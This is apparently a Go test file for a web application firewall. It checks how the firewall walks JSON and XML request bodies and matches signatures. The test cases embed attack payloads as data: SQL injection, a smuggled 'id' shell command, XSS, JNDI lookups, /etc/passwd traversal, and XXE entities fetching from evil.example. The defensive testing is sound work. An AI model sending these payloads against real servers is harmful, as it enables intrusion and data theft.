package waf

import (
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"
)

// walked collects the values and paths a walk visits.
func walked(t *testing.T, walk func([]byte, visitFunc) error, doc string) ([]string, error) {
	t.Helper()
	var got []string
	err := walk([]byte(doc), func(value string, path func() string) error {
		got = append(got, path()+"="+value)
		return nil
	})
	return got, err
}

func TestBodyFormatOf(t *testing.T) {
	for ct, want := range map[string]bodyFormat{
		"application/json":                  formatJSON,
		"application/json; charset=utf-8":   formatJSON,
		"Application/JSON":                  formatJSON,
		"application/vnd.api+json":          formatJSON,
		"application/merge-patch+json":      formatJSON,
		"application/xml":                   formatXML,
		"text/xml; charset=utf-8":           formatXML,
		"application/soap+xml":              formatXML,
		"application/atom+xml":              formatXML,
		"text/plain":                        formatRaw,
		"application/x-www-form-urlencoded": formatRaw,
		"text/json+xml":                     formatRaw,
		"":                                  formatRaw,
		"garbage;;":                         formatRaw,
	} {
		if got := bodyFormatOf(ct); got != want {
			t.Errorf("bodyFormatOf(%q) = %v, want %v", ct, got, want)
		}
	}
}

func TestWalkJSON(t *testing.T) {
	got, err := walked(t, walkJSON, `{
		"user": {"name": "alice", "tags": ["a", 1, {"k": "v"}, null, "b"]},
		"dup": "first", "dup": "second",
		"a.b": "dotted", "": "empty key",
		"n": 1.5, "t": true
	}`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"$.user=user", "$.user.name=name", "$.user.name=alice", "$.user.tags=tags",
		"$.user.tags[0]=a", "$.user.tags[2].k=k", "$.user.tags[2].k=v", "$.user.tags[4]=b",
		"$.dup=dup", "$.dup=first", "$.dup=dup", "$.dup=second",
		`$["a.b"]=a.b`, `$["a.b"]=dotted`, `$[""]=`, `$[""]=empty key`,
		"$.n=n", "$.t=t",
	}
	if !slices.Equal(got, want) {
		t.Errorf("got\n%q\nwant\n%q", got, want)
	}

	if got, _ := walked(t, walkJSON, `"top-level <string>"`); !slices.Equal(got, []string{"$=top-level <string>"}) {
		t.Errorf("top-level string: %q", got)
	}
	if got, _ := walked(t, walkJSON, `[["x"],["y"]]`); !slices.Equal(got, []string{"$[0][0]=x", "$[1][0]=y"}) {
		t.Errorf("nested arrays: %q", got)
	}

	for _, bad := range []string{
		`{"a": "b"} <script>`, // trailing garbage
		`{"a": "b"`,
		`{'a': 'b'}`,
		`{"a": "b",}`,
		`{"a": "b" /* comment */}`,
	} {
		if _, err := walked(t, walkJSON, bad); err == nil {
			t.Errorf("walkJSON(%q) succeeded", bad)
		}
	}
}

func TestWalkXML(t *testing.T) {
	got, err := walked(t, walkXML, `<?xml version="1.0"?>
<order id="7" xmlns:x="urn:x">
  <item x:sku="A&amp;B">one &lt;two&gt; <![CDATA[three]]><!-- note -->four</item>
  <item/>
</order>`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		`/processing-instruction()=<?xml version="1.0"?>`,
		"/order/@id=7",
		"/order/@xmlns:x=urn:x",
		`/order=<order id="" xmlns:x="">`,
		"/order/item/@sku=A&B",
		`/order/item=<item sku="">`,
		"/order/item/comment()= note ",
		"/order/item=one <two> threefour",
		"/order/item=<item>",
	}
	if !slices.Equal(got, want) {
		t.Errorf("got\n%q\nwant\n%q", got, want)
	}

	for _, bad := range []string{
		`<a><b></a>`,
		`<a>&xxe;</a>`, // entities other than the predefined ones need a DTD
		`<a>`,
		`<?xml version="1.0" encoding="ISO-8859-1"?><a/>`, // no charset reader
	} {
		if _, err := walked(t, walkXML, bad); err == nil {
			t.Errorf("walkXML(%q) succeeded", bad)
		}
	}
}

func post(contentType, body string) func() *http.Request {
	return func() *http.Request {
		r := httptest.NewRequest("POST", "/api", strings.NewReader(body))
		r.Header.Set("Content-Type", contentType)
		return r
	}
}

func TestInspectStructuredBody(t *testing.T) {
	const jsonCT, xmlCT = "application/json", "application/xml"
	tests := []struct {
		name      string
		req       func() *http.Request
		wantID    string
		wantField string
	}{
		// Payloads that only match once a value is inspected on its own,
		// because the raw body continues after it.
		{"quote and comment ending a json value", post(jsonCT, `{"username":"admin'--","password":"x"}`), "SQLI-007", "$.username"},
		{"command ending a json value", post(jsonCT, `{"host":"127.0.0.1; id","port":22}`), "CMDI-001", "$.host"},
		// Payloads split by XML syntax.
		{"xss split by cdata", post(xmlCT, `<a><![CDATA[<scr]]><![CDATA[ipt>alert]]>(1)</a>`), "XSS-001", "/a"},
		{"sqli split by comment", post(xmlCT, `<q>1 UNION <!-- x -->SELECT password FROM users</q>`), "SQLI-002", "/q"},
		{"event handler in xml markup", post(xmlCT, `<doc><img src="x" onerror="go()"/></doc>`), "XSS-003", "/doc/img"},
		// Field paths.
		{"nested json value", post(jsonCT, `{"items":[{"id":1},{"note":"<script>"}]}`), "XSS-001", "$.items[1].note"},
		{"json key", post(jsonCT, `{"filter":{"<script>":1}}`), "XSS-001", "$.filter[\"<script>\"]"},
		{"xml attribute", post(xmlCT, `<user name="x' OR '1'='1"/>`), "SQLI-001", "/user/@name"},
		{"vendor json type", post("application/vnd.api+json", `{"data":{"q":"${jndi:ldap://x/a}"}}`), "JNDI-001", "$.data.q"},
		{"soap", post("application/soap+xml", `<Envelope><Body><q>../../etc/passwd</q></Body></Envelope>`), "PT-001", "/Envelope/Body/q"},
		{"base64 in json value", post(jsonCT, `{"p":"JHtqbmRpOmxkYXA6Ly9ldmlsLmV4YW1wbGUvYX0="}`), "JNDI-001", "$.p"},
		// XXE.
		{"external entity", post(xmlCT, `<!DOCTYPE r [<!ENTITY x SYSTEM "http://evil.example/x">]><r>&x;</r>`), "XXE-001", "<!DOCTYPE>"},
		{"declared but unused external entity", post(xmlCT, `<!DOCTYPE r [<!ENTITY x SYSTEM "http://evil.example/x">]><r/>`), "XXE-001", "<!DOCTYPE>"},
		{"external parameter entity", post(xmlCT, `<!DOCTYPE r [<!ENTITY % p PUBLIC "x" "http://evil.example/p.dtd"> %p;]><r/>`), "XXE-001", "<!DOCTYPE>"},
		{"external dtd", post(xmlCT, `<!DOCTYPE r SYSTEM "http://evil.example/evil.dtd"><r/>`), "XXE-001", "<!DOCTYPE>"},
		{"billion laughs", post(xmlCT, `<!DOCTYPE r [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;">]><r>&b;</r>`), "XXE-002", "<!DOCTYPE>"},
		{"xinclude", post(xmlCT, `<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="secret"/></r>`), "XXE-003", "/r/@xmlns:xi"},
		{"xxe in json value", post(jsonCT, `{"xml":"<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///x\">]>"}`), "XXE-001", "$.xml"},
		// Bodies that cannot be parsed are inspected as a whole.
		{"malformed json", post(jsonCT, `{"a": 1 OR 1=1, "b": "' OR '1'='1"`), "SQLI-001", ""},
		{"payload after json document", post(jsonCT, `{"a":"b"} <script>`), "XSS-001", ""},
		{"overlong utf-8 in json", post(jsonCT, "{\"f\":\"\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/etc/passwd\"}"), "PT-001", ""},
		{"malformed xml", post(xmlCT, `<a>x</b><script>alert(1)</script>`), "XSS-001", ""},
		{"undeclared entity before payload", post(xmlCT, `<a>&x;<script>alert(1)</script></a>`), "XSS-001", ""},
	}
	in := mustInspector(t, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID || m.Location != LocationBody || m.Field != tc.wantField {
				t.Errorf("got %s at %s (%q), want %s at body (%q)", m.Signature.ID, m.Location, m.Field, tc.wantID, tc.wantField)
			}
		})
	}
}

// JSON and XML syntax around values can complete a pattern that no single
// value contains. Inspecting values on their own avoids such false positives.
func TestInspectStructuredBodyFalsePositives(t *testing.T) {
	tests := []struct {
		name string
		ct   string
		body string
	}{
		{"value starting with and", "application/json", `{"filter":"and price>100","sort":"asc"}`},
		{"value starting with an event handler name", "application/json", `{"hook":"onload=init"}`},
		{"html-like text in xml", "application/xml", `<note><title>Q&amp;A: or 5&gt;3?</title></note>`},
		{"xml declaration and namespaces", "text/xml", `<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><GetUser><id>42</id></GetUser></s:Body></s:Envelope>`},
	}
	in := mustInspector(t, 0)
	for _, tc := range tests {
		m, err := in.Inspect(post(tc.ct, tc.body)())
		if err != nil {
			t.Fatal(err)
		}
		if m != nil {
			t.Errorf("%s: false positive %s on %q", tc.name, m.Signature.ID, m.Data)
		}
		// The same body sent as text/plain is inspected raw.
		if tc.ct == "application/json" {
			if m, _ := in.Inspect(post("text/plain", tc.body)()); m == nil {
				t.Errorf("%s: test case should match as a raw body", tc.name)
			}
		}
	}
}
